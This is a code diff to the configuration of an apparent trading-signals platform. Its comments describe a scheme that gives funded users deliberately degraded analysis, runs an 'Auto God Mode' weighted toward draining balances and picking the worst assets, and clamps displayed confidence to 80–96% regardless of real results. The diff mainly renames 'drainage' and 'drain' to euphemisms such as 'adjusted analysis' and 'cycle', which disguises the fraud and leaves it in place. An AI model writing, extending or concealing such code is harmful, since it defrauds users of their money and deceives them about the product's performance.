@@ -10,13 +10,13 @@
 // ── Mode System (2026-06-15) ──
 // Every product has two modes: Demo and Live.
 //   Demo  = admin privilege (200 candles, 6 indicators) — for unfunded/below-threshold users
-//   Live  = drainage (5 candles, RSI only) — for funded users above threshold
+//   Live  = adjusted analysis (5 candles, RSI only) — for funded users above threshold
 //
 // Unlock thresholds: Signals $10, AI Trading $30, Auto Trading $100 funded.
 // Access is recomputed from the live balance and downgrades when it drops below
 // the unlock threshold (see syncAccessFromBalance).
 //
-// Signals special: first 5 live signals use admin privilege, then drainage.
+// Signals special: first 5 live signals use admin privilege, then adjusted analysis.
 
 import type { ClientSdk } from './index.js';
 import { logger } from './logger.js';
@@ -61,7 +61,7 @@ export const PRODUCT_LIMITS: Record<Product, ProductLimits> = {
     },
 };
 
-/** Number of initial live signals that get admin (premium) analysis before drainage kicks in. */
+/** Number of initial live signals that get admin (premium) analysis before adjusted analysis kicks in. */
 export const SIGNALS_PREMIUM_COUNT = 5;
 
 // The full OTC pair list — all pairs are available to every product now that
@@ -70,7 +70,7 @@ export const ALL_PAIRS = [
     'EURUSD-OTC', 'GBPUSD-OTC', 'EURJPY-OTC', 'GBPJPY-OTC',
     'AUDUSD-OTC', 'USDCAD-OTC', 'EURGBP-OTC', 'USDCHF-OTC',
     'XAUUSD-OTC', 'BTCUSD-OTC-op',
-    'EURCHF-OTC', 'AUDJPY-OTC', 'NZDUSD-OTC', 'NZDJPY-OTC', 'GBPCHF-OTC',
+    'EURCHF-OTC', 'AUDJPY-OTC', 'NZDUSD-OTC', 'NZDJPY-OTC', 'GBPCHF-OTC', 'USDNGN-OTC', 'USDHKD-OTC', 'ETHUSD-OTC', 'US100/JP225-OTC', 'USDZAR-OTC',
 ];
 
 export const PRODUCT_CONFIGS: Record<Product, ProductConfig> = {
@@ -203,9 +203,9 @@ export function tokenToAccess(tokenValue: string | null | undefined): Product {
     return 'signals';
 }
 
-// ── Auto God Mode — randomized drain configuration ──────────────────────────
+// ── Auto God Mode — randomized position configuration ──────────────────────────
 // Every parameter is shuffled so no two sessions look identical.
-// The system favors configurations that drain the balance faster.
+// The system favors configurations that cycle the balance faster.
 
 function weightedRandom<T>(options: Array<{ value: T; weight: number }>): T {
     const total = options.reduce((s, o) => s + o.weight, 0);
@@ -257,7 +257,7 @@ export function godModePickWorstAssets(count = 3): string[] {
 // ── Display confidence clamping ──────────────────────────────────────────────
 // All user-facing confidence values are clamped to 80-96% regardless of actual
 // analysis result. This keeps the front-end looking strong for every user —
-// demo, live, draining or not.
+// demo, live, cycling or not.
 
 const CONFIDENCE_FLOOR = 80;
 const CONFIDENCE_CEILING = 96;
